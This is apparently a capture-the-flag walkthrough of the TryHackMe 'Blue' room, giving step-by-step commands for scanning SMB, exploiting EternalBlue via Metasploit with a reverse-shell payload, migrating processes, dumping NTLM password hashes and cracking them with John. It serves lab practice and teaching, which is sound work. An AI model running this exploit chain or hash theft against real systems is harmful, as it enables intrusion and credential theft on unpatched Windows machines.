# Blue

# Author

**Amarjeet Singh**

Cybersecurity Enthusiast | CTF Player | Penetration Testing Learner

---

# Disclaimer

Never run EternalBlue against systems you do not own or have permission to test.

---

# Step 1 — Nmap Scan

Run a full service/version scan.

```bash
nmap -sV -sC -O <TARGET_IP> -oN nmap.txt

```

Example:

```bash
nmap -sV -sC -O 10.10.10.10 -oN nmap.txt

```

Expected open ports:

```text
135/tcp  msrpc
139/tcp  netbios-ssn
445/tcp  microsoft-ds
3389/tcp ms-wbt-server
```

The important port is:

```text
445/tcp
```

This usually indicates SMB services.

---

# Step 2 — Open Metasploit

Start Metasploit:

```bash
msfconsole
```

Search for EternalBlue exploit:

```bash
search eternalblue
```

Use the exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Show options:

```bash
show options
```

---

# Step 3 — Configure the Exploit

Set target IP:

```bash
set RHOSTS <TARGET_IP>
```

Set payload:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

Set local host:

```bash
set LHOST <YOUR_IP>
```

Check settings:

```bash
show options
```

Example:

```bash
set RHOSTS 10.10.10.10
set LHOST 10.17.1.5
```

---

# Step 4 — Run the Exploit

Execute:

```bash
run
```

If successful:

```text
Meterpreter session opened
```

You now have SYSTEM-level access.

Verify:

```bash
getuid
```

Expected output:

```text
NT AUTHORITY\SYSTEM
```

---

# Step 5 — Background the Session

Press:

```text
CTRL + Z
```

Then:

```text
y
```

List sessions:

```bash
sessions
```

---

# Step 6 — Migrate Process (Recommended)

Interact with session:

```bash
sessions -i 1
```

List processes:

```bash
ps
```

Migrate to stable process:

```bash
migrate <PID>
```

Example:

```bash
migrate 1224
```

---

# Step 7 — Find the Flags

Move to desktop:

```bash
cd C:\Users
```

List users:

```bash
ls
```

Navigate to user desktop:

```bash
cd Jon\Desktop
```

List files:

```bash
ls
```

Read flag:

```bash
cat flag1.txt
```

---

# Step 8 — Locate Additional Flags

Search entire filesystem:

```bash
search -f flag*.txt
```

Or manually check:

```text
C:\
C:\Windows\System32\config
C:\Users
```

Read all flags using:

```bash
cat <filename>
```

---

# Step 9 — Hash Dumping

Dump password hashes:

```bash
hashdump
```

Example output:

```text
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

## Step 10 - See Cracked Password 

```text
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

# Final Notes

The Blue room teaches:

* SMB exploitation basics
* EternalBlue vulnerability
* Windows post exploitation
* Meterpreter usage

Always practice only in legal environments such as:

* TryHackMe
* Hack The Box
* Personal labs
